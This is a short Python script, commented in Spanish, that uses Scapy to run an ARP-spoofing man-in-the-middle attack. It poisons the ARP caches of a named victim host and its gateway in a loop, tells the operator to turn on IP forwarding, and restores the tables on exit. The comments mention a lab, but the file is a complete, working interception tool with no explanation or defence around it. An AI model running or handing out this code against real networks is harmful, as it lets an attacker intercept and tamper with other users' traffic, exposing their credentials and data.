import sys
import time
from scapy.all import ARP, send, getmacbyip

def spoof(ip_destino, ip_copiar):
    """Envía un ARP Reply indicando que nuestra MAC posee la 'ip_copiar'."""
    mac_destino = getmacbyip(ip_destino)
    if not mac_destino:
        return False

    paquete = ARP(op=2, pdst=ip_destino, hwdst=mac_destino, psrc=ip_copiar)
    send(paquete, verbose=False)
    return True

def restaurar_red(ip_destino, ip_origen):
    """Devuelve las tablas ARP de los objetivos a sus valores reales."""
    mac_destino = getmacbyip(ip_destino)
    mac_origen = getmacbyip(ip_origen)

    if mac_destino and mac_origen:
        paquete = ARP(op=2, pdst=ip_destino, hwdst=mac_destino, psrc=ip_origen, hwsrc=mac_origen)
        send(paquete, count=4, verbose=False)

if __name__ == "__main__":
    # === CONFIGURACIÓN CON TUS IPS EXACTAS ===
    IP_VICTIMA = "192.168.124.133"
    IP_GATEWAY = "192.168.124.1"
    # ==========================================

    print(f"[*] Iniciando entorno MitM ARP en el segmento 192.168.124.0/24...")
    print(f"[*] Objetivos: Víctima ({IP_VICTIMA}) <--> Gateway ({IP_GATEWAY})")
    print("[*] Ejecutando desde la IP Atacante: 192.168.124.135")
    print("[!] Asegúrate de haber ejecutado: 'sudo sysctl -w net.ipv4.ip_forward=1'")

    try:
        while True:
            spoof(IP_VICTIMA, IP_GATEWAY)
            spoof(IP_GATEWAY, IP_VICTIMA)
            print(f"[+] Paquetes ARP enviados con éxito. MitM Activo.", end="\r")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Ataque interrumpido por el usuario. Limpiando laboratorio...")
        restaurar_red(IP_VICTIMA, IP_GATEWAY)
        restaurar_red(IP_GATEWAY, IP_VICTIMA)
        print("[+] Tablas ARP restauradas. Topología original a salvo.")